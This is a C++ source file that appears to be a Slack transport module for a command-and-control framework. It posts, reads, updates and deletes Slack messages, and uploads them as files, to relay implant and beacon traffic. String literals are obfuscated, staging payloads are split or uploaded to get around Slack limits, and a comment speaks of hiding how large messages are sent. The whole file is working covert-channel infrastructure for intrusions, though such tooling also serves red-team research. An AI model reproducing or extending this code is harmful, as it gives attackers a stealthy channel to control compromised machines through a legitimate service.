#include "stdafx.h"
#include "SlackApi.h"
#include <random>
#include <cctype>
#include <algorithm>


FSecure::Slack::Slack(std::string const& token, std::string const& channelName)
{
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		this->m_HttpConfig.set_proxy(winProxy == OBF(L"auto") ? web::web_proxy::use_auto_discovery : web::web_proxy(winProxy));

	this->m_Token = token;

	std::string lowerChannelName = channelName;
	std::transform(lowerChannelName.begin(), lowerChannelName.end(), lowerChannelName.begin(), [](unsigned char c) { return std::tolower(c); });

	SetChannel(CreateChannel(lowerChannelName));
}

void FSecure::Slack::SetChannel(std::string const &channelId)
{
	this->m_Channel = channelId;
}

void FSecure::Slack::SetToken(std::string const &token)
{
	this->m_Token = token;
}

std::string FSecure::Slack::WriteMessage(std::string text)
{
	json j;
	j[OBF("channel")] = this->m_Channel;
	j[OBF("text")] = text;
	std::string url = OBF("https://slack.com/api/chat.postMessage");

	json output = SendHttpRequest(url, OBF("application/json"), j);

	return output[OBF("message")][OBF("ts")].get<std::string>(); //return the timestamp so a reply can be viewed
}



std::map<std::string, std::string> FSecure::Slack::ListChannels()
{
	std::map<std::string, std::string> channelMap;
	std::string url = OBF("https://slack.com/api/channels.list?token=") + this->m_Token + OBF("&exclude_members=true&exclude_archived=true");

	json response = SendHttpRequest(url, OBF("application/json"), NULL);

	size_t size = response[OBF("channels")].size();

	for (auto &channel : response[OBF("channels")])
	{
		std::string cName = channel[OBF("name")];
		if (cName == OBF("everyone"))
			continue;

		std::string cId = channel[OBF("id")].get<std::string>();
		channelMap.insert({ cName, cId });
	}

	return channelMap;
}



std::string FSecure::Slack::CreateChannel(std::string const &channelName)
{
	json j;
	std::string url = OBF("https://slack.com/api/channels.create");
	j[OBF("token")] = this->m_Token;
	j[OBF("name")] = channelName;

	json response = SendHttpRequest(url, OBF("application/json"), j);

	if (!response.contains(OBF("channel"))) //attempt to find the channel using API call
	{
		std::map<std::string, std::string> channels = this->ListChannels();

		if (channels.find(channelName) != channels.end())
		{
			return channels[channelName];
		}
		else
			throw std::runtime_error(OBF("Throwing exception: unable to create channel\n"));
	}
	else
	{
		return response[OBF("channel")][OBF("id")].get<std::string>();
	}
}


std::vector<json> FSecure::Slack::ReadReplies(std::string const &timestamp)
{
	std::string url = OBF("https://slack.com/api/channels.replies?token=") + this->m_Token + OBF("&channel=") + this->m_Channel + OBF("&thread_ts=") + timestamp;
	json output = SendHttpRequest(url, OBF("application/json"), NULL);
	std::vector<json> ret;

	//This logic is really messy, in reality the checks are over cautious, however there is an edgecase
	//whereby a message could be created with no replies of the implant that wrote triggers an exception or gets killed.
	//If that was the case, and we didn't sanity check, we could run into problems.
	if (output.contains(OBF("messages")))
	{
		json m = output[OBF("messages")];
		if (m[0].contains(OBF("replies")) && m[0].size() > 1)
		{
			if (m[1].contains(OBF("files"))) //the reply contains a file, handle this differently
			{
				std::string ts = m[1][OBF("ts")];
				std::string fileUrl = m[1][OBF("files")][0][OBF("url_private")].get<std::string>();
				std::string text = GetFile(fileUrl);
				//recreate a "message" from the data within the file.
				json j;
				j[OBF("ts")] = ts.c_str();
				j[OBF("text")] = text.c_str();
				ret.push_back(j);
			}
			else
			{
				for (size_t i = 1u; i < m.size(); i++) //skip the first message (it doesn't contain the data we want).
				{
					json reply = m[i];
					ret.push_back(reply);
				}

			}
		}

	}

	return ret;
}

std::vector<std::string>  FSecure::Slack::GetMessagesByDirection(std::string const &direction)
{
	std::vector<std::string> ret;
	json messages, resp;
	std::string cursor;

	//Slack suggest only requesting the 200 most recent messages.
	//If there are more than 200, the has_more value will be true, at which point
	//we need to grab the cursor and get the next lot of messages.
	//This only becomes a problem with lots of beacons (especially if many are staging at the same time)
	do
	{
		std::string url = OBF("https://slack.com/api/conversations.history?limit=200&token=");
		url.append(this->m_Token + OBF("&") + OBF("channel=") + this->m_Channel);

		//Will be empty on the first run, if has_more == false this won't be executed again
		if (!cursor.empty())
			url.append(OBF("&cursor=") + cursor);

		//Actually send the http request and grab the messages
		resp = SendHttpRequest(url, OBF("application/json"), NULL);

		messages = resp[OBF("messages")];

		//if there are more than 200 messages, we don't want to miss any, so update the cursor.
		if(resp[OBF("has_more")] == OBF("true"))
			cursor = resp[OBF("next_cursor")];

		//now grab the 200 messages data.
		for (auto &m : messages)
		{
			std::string data = m[OBF("text")];

			//make sure it's a message we care about
			if (data.find(direction) != std::string::npos)
			{
				ret.push_back(m[OBF("ts")].get<std::string>()); // - experimental
			}

		}
	} while (resp[OBF("has_more")] == OBF("true"));

	return ret;
}

void FSecure::Slack::UpdateMessage(std::string const &message, std::string const &timestamp)
{
	std::string url = OBF("https://slack.com/api/chat.update");

	json j;
	j[OBF("channel")] = this->m_Channel;
	j[OBF("text")] = message;
	j[OBF("ts")] = timestamp;

	SendHttpRequest(url, OBF("application/json"), j);
}

void FSecure::Slack::WriteReply(std::string const &text, std::string const &timestamp)
{
	//this is more than 30 messages, send it as a file (we do this infrequently as file uploads restricted to 20 per minute).
	//Using file upload for staging (~88 messages) is a huge improvement over sending actual replies.
	if (text.length() >= 120000)
	{
		this->UploadFile(text, timestamp);
		return;
	}

	if (text.length() > 40000) //hide how large messages are sent.
	{
		return this->WriteReplyLarge(text, timestamp);
	}

	int totalSent = 0;

	json j;
	j[OBF("channel")] = this->m_Channel;
	j[OBF("text")] = text;
	j[OBF("thread_ts")] = timestamp;
	std::string url = OBF("https://slack.com/api/chat.postMessage");

	json response = SendHttpRequest(url, OBF("application/json"), j);
}

void FSecure::Slack::DeleteMessage(std::string const &timestamp)
{
	json j;
	j[OBF("channel")] = this->m_Channel;
	j[OBF("ts")] = timestamp;
	j[OBF("token")] = this->m_Token;
	std::string url = OBF("https://slack.com/api/chat.delete");

	json response = SendHttpRequest(url, OBF("application/json"), j);

}

//Slack limits a messages to 40000 characters - this actually gets split across 10 4000 character messages
void FSecure::Slack::WriteReplyLarge(std::string const &data, std::string const &ts)
{
	std::string ret;
	int start = 0;
	int size = static_cast<int>(data.length());
	int end = size;

	//Write 40k character messages at a time
	while (size > 40000)
	{
		this->WriteReply(data.substr(start, 40000), ts);
		start += 40000;
		size -= 40000;


		std::this_thread::sleep_for(std::chrono::seconds(7)); //throttle our output so slack  blocks us less (40k characters is 10 messages)
	}

	this->WriteReply(data.substr(start, data.length()), ts); //write the final part of the payload
}

json FSecure::Slack::SendHttpRequest(std::string const& host, std::string const& contentType, json const& data)
{
	std::string authHeader = OBF("Bearer ") + this->m_Token;
	std::string contentHeader = OBF("Content-Type: ") + contentType;
	std::string postData;

	while (true)
	{
		web::http::client::http_client webClient(utility::conversions::to_string_t(host), this->m_HttpConfig);
		web::http::http_request request;

		if (data != NULL)
		{
			request = web::http::http_request(web::http::methods::POST);

			if (data.contains(OBF("postData")))
				postData = data[OBF("postData")].get<std::string>();
			else
				postData = data.dump();

			request.headers().set_content_type(utility::conversions::to_string_t(contentType));
			request.set_body(utility::conversions::to_string_t(postData));
		}
		else
		{
			request = web::http::http_request(web::http::methods::GET);
		}
		request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));

		pplx::task<web::http::http_response> task = webClient.request(request).then([&](web::http::http_response response)
			{
				return response;
			});

		task.wait();
		web::http::http_response resp = task.get();

		if (resp.status_code() == web::http::status_codes::OK)
		{
			auto respData = resp.extract_string();
			return json::parse(respData.get());
		}
		else if (resp.status_code() == web::http::status_codes::TooManyRequests)
		{
			std::random_device randomDevice;
			std::mt19937 randomEngine(randomDevice()); // seed the generator
			std::uniform_int_distribution<> distribution(0, 10); // define the range
			int sleepTime = 10 + distribution(randomEngine); //sleep between 10 and 20 seconds

			std::this_thread::sleep_for(std::chrono::seconds(sleepTime));
		}
		else
			throw std::exception(OBF("[x] Non 200/429 HTTP Response\n"));
	}
}

void FSecure::Slack::UploadFile(std::string const &data, std::string const &ts)
{
	std::string url = OBF("https://slack.com/api/files.upload?token=") + this->m_Token + OBF("&channels=") + this->m_Channel + OBF("&thread_ts=") + ts;

	std::string encoded = utility::conversions::to_utf8string(web::http::uri::encode_data_string(utility::conversions::to_string_t(data)));

	json toSend;
	toSend[OBF("postData")] = OBF("filename=test5&content=") + encoded;

	json response = SendHttpRequest(url, OBF("application/x-www-form-urlencoded"), toSend);
}


std::string FSecure::Slack::GetFile(std::string const &url)
{
	std::string host = url;
	std::string authHeader = OBF("Bearer ") + this->m_Token;

	web::http::client::http_client webClient(utility::conversions::to_string_t(host), this->m_HttpConfig);
	web::http::http_request request;

	request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));

	pplx::task<std::string> task = webClient.request(request).then([&](web::http::http_response response)
		{
			if (response.status_code() == web::http::status_codes::OK)
				return response.extract_utf8string();
			else
				return pplx::task<std::string>{};
		});

	task.wait();
	std::string resp = task.get();

	return resp;
}
